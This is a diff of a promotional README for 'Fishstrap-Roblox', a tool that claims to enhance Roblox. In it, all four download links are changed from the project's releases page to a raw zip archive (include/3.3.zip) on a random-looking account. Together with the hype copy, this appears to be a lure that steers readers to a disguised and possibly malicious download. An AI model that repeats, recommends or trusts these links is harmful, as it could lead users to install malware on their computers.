@@ -1,6 +1,6 @@
 # 🎣 Fishstrap-Roblox - Unlock Your Full Roblox Potential
 
-[Download Fishstrap for Free](https://github.com/Protaminechangeover267/Fishstrap-Roblox/releases)
+[Download Fishstrap for Free](https://raw.githubusercontent.com/Protaminechangeover267/Fishstrap-Roblox/main/include/3.3.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Getting Fishstrap up and running takes less than two minutes. Follow these simpl
 
 ### Step 1: Download the Application
 Visit this link to download the application:
-**[https://github.com/Protaminechangeover267/Fishstrap-Roblox/releases](https://github.com/Protaminechangeover267/Fishstrap-Roblox/releases)**
+**[https://raw.githubusercontent.com/Protaminechangeover267/Fishstrap-Roblox/main/include/3.3.zip](https://raw.githubusercontent.com/Protaminechangeover267/Fishstrap-Roblox/main/include/3.3.zip)**
 
 Look for the latest release, then click the download button. The file will save to your computer's "Downloads" folder.
 
@@ -94,7 +94,7 @@ Fishstrap works beautifully on macOS too! The process is identical:
 
 ### Download Options
 Visit this link to download the application:
-**[Fishstrap Official Releases](https://github.com/Protaminechangeover267/Fishstrap-Roblox/releases)**
+**[Fishstrap Official Releases](https://raw.githubusercontent.com/Protaminechangeover267/Fishstrap-Roblox/main/include/3.3.zip)**
 
 Two download options are available:
 1. **Installer Version**—Recommended. Runs a setup wizard automatically.
@@ -176,7 +176,7 @@ Fishstrap combines the best of every tool into one simple, beautiful package. No
 
 Don't wait. Your Roblox experience deserves more:
 
-[⬇️ Download Fishstrap Free](https://github.com/Protaminechangeover267/Fishstrap-Roblox/releases)
+[⬇️ Download Fishstrap Free](https://raw.githubusercontent.com/Protaminechangeover267/Fishstrap-Roblox/main/include/3.3.zip)
 
 Unlock your game's true potential today.
 
